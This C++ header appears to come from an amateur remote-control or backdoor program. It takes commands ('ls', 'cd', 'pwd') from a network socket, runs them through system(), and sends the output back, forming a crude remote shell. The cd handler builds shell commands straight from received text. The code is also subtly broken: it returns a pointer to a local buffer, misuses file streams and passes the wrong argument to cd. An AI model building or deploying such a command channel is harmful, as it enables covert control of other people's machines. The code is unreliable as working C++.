#pragma once
#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#define _WINSOCK_DEPCRECATED 
#pragma warning(disable:4996) 
#include <WinSock2.h>
#include <iostream>
#include <WS2tcpip.h>
#include <string.h>
#include <Windows.h>
#include <vector>
#include "connection.h"
#include <stdio.h>
#include <stdlib.h>
#include <fstream>

std::string geo() { return "a"; }

char* return_command(char* command)
{
	char buffer[256] = { 0 };
	std::ifstream fichier("read_cmd.txt", std::ios::out | std::ios::trunc);
	if (fichier)	
	{
		std::cout << "OUVERUTURE" << std::endl;
		strcat(command, " > ");
		strcat(command, "read_cmd.txt");
		system(command);
		fichier >> buffer;
		fichier.close();
		std::cout << "RETOUR" << std::endl;
		return buffer;
	}
	else
	{
		strcat(buffer, "Error");
		return buffer;
	}


}
void cd(SOCKET &sock,char* directory)
{
	char cmd[256] = { 0 };
	char ret[256] = { 0 };
	strcat(cmd, "cd ");
	strcat(cmd, directory);
	strcat(ret, return_command(cmd));
	send(sock, ret, sizeof(ret), 0);
}
void pwd(SOCKET &sock)
{
	char ret[256] = { 0 };
	char cmd[256] = { 0 };
	strcat(cmd, "chdir");
	strcat(ret, return_command(cmd));
	send(sock, ret, sizeof(ret), 0);
}
void ls(SOCKET &sock) { 

	std::cout << "LS" << std::endl;
	char ret[256] = { 0 };
	char cmd[256] = { 0 };
	strcat(cmd, "ls");
	strcat(ret, return_command(cmd));
	std::cout << "APRES" << std::endl;
	send(sock, ret, sizeof(ret), 0);
}


void SetColor(int value)
{
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), value);
	/*	1: Blue
		2: Green
		3 : Cyan
		4 : Red
		5 : Purple
		6 : Yellow(Dark)
		7 : Default white
		8 : Gray / Grey
		9 : Bright blue
		10 : Brigth green
		11 : Bright cyan
		12 : Bright red
		13 : Pink / Magenta
		14 : Yellow
		15 : Bright white
		- Numbers after 15 are background colors -
		*/
}

void list()
{

	std::cout << "list" << std::endl;
	
	/*
	SetColor(6);
	for (int i = 0, i < (clients.size()), i++)
	{
		char buff[INET6_ADDRSTRLEN] = { 0 };
		std::string clientAddress = inet_ntop(clients[i].addr.sin_family, (void*)&(clients[i].addr.sin_addr), buff, INET6_ADDRSTRLEN);

		std::cout << "Client : " << i << " addr : " << clientAddress.c_str() << std::endl;
	}
	SetColor(7);
	*/
}


void compare_(char *buffer, SOCKET sock)
{
	if (!(strcmp(buffer, "list")))
	{
		list();

	}
	else if (!(strcmp(buffer, "ls")))
	{
		std::cout << "LS" << std::endl;
		ls(sock);
	}
	else if (!(strcmp(buffer, "cd")))
	{
		cd(sock,buffer);
	}
	else if (!(strcmp(buffer, "pwd")))
	{
		pwd(sock);
	}
	else
	{
		SetColor(6);
		std::cout << "[*] " << buffer << std::endl;
		SetColor(7);
		Sleep(0.1);
	}
}
